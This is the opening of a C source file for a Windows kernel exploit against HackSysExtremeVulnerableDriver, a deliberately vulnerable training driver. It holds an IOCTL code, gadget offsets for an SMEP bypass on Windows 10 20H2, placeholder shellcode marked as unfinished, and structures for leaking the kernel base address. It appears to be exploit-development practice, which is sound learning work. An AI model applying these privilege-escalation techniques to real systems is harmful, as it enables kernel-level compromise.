#include <Windows.h>
#include <stdio.h>

#define DEVICE "\\\\.\\HackSysExtremeVulnerableDriver"
#define TARGET_IOCTL 0x222003

// Offsets defined for Windows 10 20H2
#define HVLENDSYSTEMINTERRUPT_POP_RCX_OFFSET 0x3F3BC0L // HvlEndSystemInterrupt
#define KIENABLEXSAVE_MOV_CR4_RCX_OFFSET 0x9A41E3L // KiEnableXSave

char unused = 0;

// TODO: Make (or find) shellcode that functions...
char shellcode[2] = {
	0xCC, 0xC3
};

int main(int argc, char** argv);
void initialize_shellcode();
long long leak_ntoskrnl_base_address();

// Credits to tekwizz123 and h0mbre for these structure and function definitions.
// Link: https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/
typedef struct SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
	ULONG				 Reserved3;
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 LoadCount;
	WORD                 NameOffset;
	CHAR                 Name[256];
} SYSTEM_MODULE, * PSYSTEM_MODULE;

// Credits to tekwizz123 and h0mbre for these structure and function definitions.
// Link: https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/
typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

// Credits to tekwizz123 and h0mbre for these structure and function definitions.
// Link: https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/
typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 0xB
} SYSTEM_INFORMATION_CLASS;

// Credits to tekwizz123 and h0mbre for these structure and function definitions.
// Link: https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/
typedef NTSTATUS(WINAPI* NtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);